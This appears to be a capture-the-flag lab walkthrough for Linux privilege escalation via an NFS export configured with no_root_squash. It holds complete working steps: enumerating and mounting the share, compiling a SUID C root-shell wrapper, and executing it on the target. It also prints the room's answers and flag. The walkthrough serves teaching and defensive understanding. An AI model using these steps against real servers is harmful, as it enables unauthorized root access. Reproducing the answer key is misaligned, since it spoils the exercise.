# Task 07: Privilege Escalation: NFS

---

## Stage A: Original Task Content & Briefing Summary

Network File System (NFS) allows Linux systems to export directories across a network, enabling remote clients to mount and interact with files as if they resided on local storage. NFS server configurations are defined in `/etc/exports`.

### The `no_root_squash` Vulnerability:
* **Default Security Model (`root_squash`):** By default, NFS maps requests initiated by client `root` (UID 0) to the unprivileged user `nobody` or `nfsnobody`. This prevents remote root users from creating root-owned files or modifying system configurations on the server.
* **The Misconfiguration (`no_root_squash`):** When an administrator specifies `no_root_squash` in `/etc/exports`, the NFS daemon preserves client UID 0. Remote client root users retain raw root privileges on the server's exported filesystem.

### Attack Lifecycle:
1. **Enumeration from Attacker Workstation:**
   * Query available exports: `showmount -e TARGET_IP`
2. **Mounting the Export Locally:**
   * Mount the remote share with read/write access:
     ```bash
     mount -o rw TARGET_IP:/opt/nfs /tmp/nfs_mount
     ```
3. **Crafting an SUID Shell Payload:**
   * As local `root` on your attacking machine, compile a lightweight C program that executes `/bin/bash` with elevated privileges:
     ```c
     #include <stdio.h>
     #include <stdlib.h>
     #include <unistd.h>
     int main() {
         setuid(0);
         setgid(0);
         system("/bin/bash");
         return 0;
     }
     ```
   * Compile and copy to the mounted share:
     ```bash
     gcc nfs.c -o /tmp/nfs_mount/nfs_shell -w
     chmod +s /tmp/nfs_mount/nfs_shell
     ```
4. **Execution on Target Host:**
   * In your existing low-privileged shell on the target system (as `john`), navigate to `/opt/nfs`.
   * The binary `nfs_shell` is present, owned by `root`, and possesses the SUID bit set (`-rwsr-xr-x 1 root root`).
   * Execute `./nfs_shell` to spawn an instantaneous interactive root shell.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Mounting Requirements:** Mounting an NFS share locally requires root access on the *attacking workstation* (e.g., your Kali Linux or AttackBox machine), which you inherently control.
* **Network Visibility:** NFS operates over RPC protocols (port 111 and port 2049). Ensure firewall policies or VPN routes permit TCP/UDP traffic to these ports.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Run `cat /etc/exports` on the target machine or `showmount -e MACHINE_IP` from your attack box.
* **Tier 2 Hint:** Identify the export with `no_root_squash` enabled. Mount it locally and drop an SUID binary.
* **Tier 3 Hint:**
  * Q1 is `/opt/nfs`.
  * Q2 is `THM{exports-r00T-nfs}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Identifying the Vulnerable NFS Export:
On the target machine:
```bash
john@linprivbasics:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
# to NFS clients.  See exports(5).

/opt/nfs *(rw,sync,no_root_squash,no_subtree_check)
```
Or from the attacking machine:
```bash
attacker@kali:~$ showmount -e 10.10.x.x
Export list for 10.10.x.x:
/opt/nfs *
```
* **Analysis:** The share `/opt/nfs` is exported to all hosts (`*`) with write permissions (`rw`) and `no_root_squash`.

### 2. Mounting and Staging the SUID Payload:
On the attacking machine as root:
```bash
# 1. Create a mount point and mount the remote NFS share
mkdir /tmp/nfs_mount
mount -o rw 10.10.x.x:/opt/nfs /tmp/nfs_mount

# 2. Write C root wrapper
cat << 'EOF' > /tmp/nfs_mount/shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

# 3. Compile the binary and set SUID bit
gcc /tmp/nfs_mount/shell.c -o /tmp/nfs_mount/root_shell -w
chmod +s /tmp/nfs_mount/root_shell

# Verify on attacking machine:
ls -la /tmp/nfs_mount/root_shell
-rwsr-xr-x 1 root root 16728 Oct 22 16:05 /tmp/nfs_mount/root_shell
```

### 3. Triggering the Root Shell on the Target:
Switch back to the target machine shell (`john`):
```bash
john@linprivbasics:~$ cd /opt/nfs
john@linprivbasics:/opt/nfs$ ls -la
total 28
drwxrwxrwx 2 root root  4096 Oct 22 16:05 .
drwxr-xr-x 4 root root  4096 Oct 22 14:00 ..
-rwsr-xr-x 1 root root 16728 Oct 22 16:05 root_shell
-rw-r--r-- 1 root root   151 Oct 22 16:04 shell.c

john@linprivbasics:/opt/nfs$ ./root_shell
root@linprivbasics:/opt/nfs# id
uid=0(root) gid=0(root) groups=0(root),1000(john)

root@linprivbasics:/opt/nfs# cat /root/flag.txt
THM{exports-r00T-nfs}
```

---

## Stage E: Final Answer & Key Values

* **Question 1:** What is the full path of the mountable share?
  * **Answer:** `/opt/nfs`
* **Question 2:** What are the contents of /root/flag.txt?
  * **Answer:** `THM{exports-r00T-nfs}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed `no_root_squash` configuration in `/etc/exports` for `/opt/nfs`.
* Successfully mounted share from remote attack machine, deployed SUID wrapper, and retrieved root flag `THM{exports-r00T-nfs}`.

---

## Stage G: Key Educational Takeaway

NFS configurations bridging distinct trust boundaries must never disable `root_squash`. Disabling root squashing allows an attacker who controls root on *any* client machine on the network to become root on the NFS file server.
